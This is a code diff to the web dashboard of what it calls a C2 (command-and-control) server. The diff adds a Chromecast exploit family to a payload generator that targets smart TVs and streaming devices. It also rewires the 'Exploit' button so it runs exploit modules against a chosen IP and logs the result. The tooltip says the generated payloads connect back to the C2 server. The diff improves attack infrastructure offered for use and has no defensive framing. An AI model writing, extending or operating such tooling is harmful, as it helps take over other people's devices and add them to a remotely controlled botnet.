@@ -855,7 +855,7 @@
       <div class="card-header">
         <span class="card-title">Exploit Payload Generator</span>
         <div class="help-icon">?
-          <div class="tooltip">Generates family-specific exploit payloads that connect back to this C2 server. Select target IP and device family, then click Generate to create the payload.</div>
+          <div class="tooltip">Generates family-specific exploit payloads that connect back to this C2 server. Select target IP and device family, then click Generate to create the payload. Click Exploit to execute the exploit module against the target right now — the activity log reports the module's real outcome (success, failure, timeout or error, with duration).</div>
         </div>
       </div>
       <div class="card-body">
@@ -875,6 +875,7 @@
               <option value="adb-net">Android TV / Fire TV</option>
               <option value="roku-ecp">Roku</option>
               <option value="vizio-dial">Vizio SmartCast</option>
+              <option value="chromecast-cast">Chromecast / Google TV</option>
               <option value="dlna">DLNA (Generic)</option>
             </select>
           </div>
@@ -882,7 +883,7 @@
             <button class="btn btn-primary" onclick="generatePayload()" data-tooltip="Generate exploit payload">Generate</button>
           </div>
           <div class="form-group" style="flex:0">
-            <button class="btn btn-success" onclick="deployPayload()" data-tooltip="Deploy payload to target">Exploit</button>
+            <button class="btn btn-success" onclick="deployPayload()" data-tooltip="Run the exploit module against the target and report the real result">Exploit</button>
           </div>
         </div>
         <div id="payload-output"></div>
@@ -1532,13 +1533,13 @@ function exploitTarget(ip, deviceType) {
     'Android TV/Fire TV': 'adb-net',
     'Roku': 'roku-ecp',
     'Vizio': 'vizio-dial',
-    'Chromecast': 'dlna',
-    'Chromecast / Google TV': 'dlna',
+    'Chromecast': 'chromecast-cast',
+    'Chromecast / Google TV': 'chromecast-cast',
     'Unknown': 'dlna'
   };
   let family = familyMap[deviceType] || 'dlna';
   const tvT = familyToTvType(deviceType);
-  if (tvT === 'chromecast') family = 'dlna';
+  if (tvT === 'chromecast') family = 'chromecast-cast';
   document.getElementById('payload-ip').value = ip;
   document.getElementById('payload-family').value = family;
   switchTab('payload');
@@ -1561,15 +1562,33 @@ async function generatePayload() {
 }
 
 async function deployPayload() {
-  const targetIp = document.getElementById('payload-ip').value;
+  const targetIp = document.getElementById('payload-ip').value.trim();
   const family = document.getElementById('payload-family').value;
   if (!targetIp) {
     alert('Please enter a target IP address');
     return;
   }
-  addLog(`Deploying exploit to ${targetIp}...`);
-  await api('/api/command', 'POST', { device_id: targetIp, command: 'deploy', params: { family } });
-  addLog(`Exploit deployed to ${targetIp}`);
+  const tvType = familyToTvType(family);
+  addLog(`Exploit on ${targetIp} (${family}) — running the exploit module...`);
+  try {
+    const res = await api('/api/exploit', 'POST',
+                          { ip: targetIp, family, tv_type: tvType });
+    if (res.error || res.attempted === false) {
+      addLog(`Exploit not run on ${targetIp}: ${res.error || 'no module available'}`);
+      return;
+    }
+    const dur = (res.duration_s !== undefined && res.duration_s !== null)
+      ? ` in ${res.duration_s}s` : '';
+    if (res.success) {
+      addLog(`Exploit succeeded on ${targetIp} (${res.tv_type})${dur}`);
+    } else if (res.timed_out) {
+      addLog(`Exploit timed out on ${targetIp} (${res.tv_type})${dur}: ${res.error || 'module exceeded its time budget'}`);
+    } else {
+      addLog(`Exploit failed on ${targetIp} (${res.tv_type})${dur}${res.error ? ': ' + res.error : ''}`);
+    }
+  } catch (e) {
+    addLog(`Exploit request failed: ${e.message || e}`);
+  }
 }
 
 function closePayloadModal() {
